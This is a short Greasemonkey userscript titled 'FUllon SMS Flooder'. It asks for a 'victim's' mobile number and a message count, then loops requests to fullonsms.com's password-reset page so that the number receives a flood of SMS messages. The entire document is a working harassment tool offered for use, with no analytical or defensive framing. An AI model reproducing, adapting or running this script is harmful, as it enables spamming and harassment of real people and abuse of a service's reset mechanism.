// ==UserScript==
// @name           FUllon SMS Flooder by sunny020
// @namespace      SUNNY020
// @description    SMS Flooder
// @include        http://*fullonsms.com/*
// ==/UserScript==

var victim = prompt("Enter the victim's Mobile Number", "");
var n = prompt("Enter the number of messages you want to send", "");
if(document.location=="http://fullonsms.com/ForgotPassword.php"){

document.forms[0].elements[0].value=victim;
for(var i=1;i<n;i++)
sendSMS(victim, i);
}

function sendSMS(no, a) {
    with(x = new XMLHttpRequest()) open("GET", "ForgotPassword.php?MobileNumber="+victim+"&Pr="+a, false), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(null);
	return x.responseText;
}
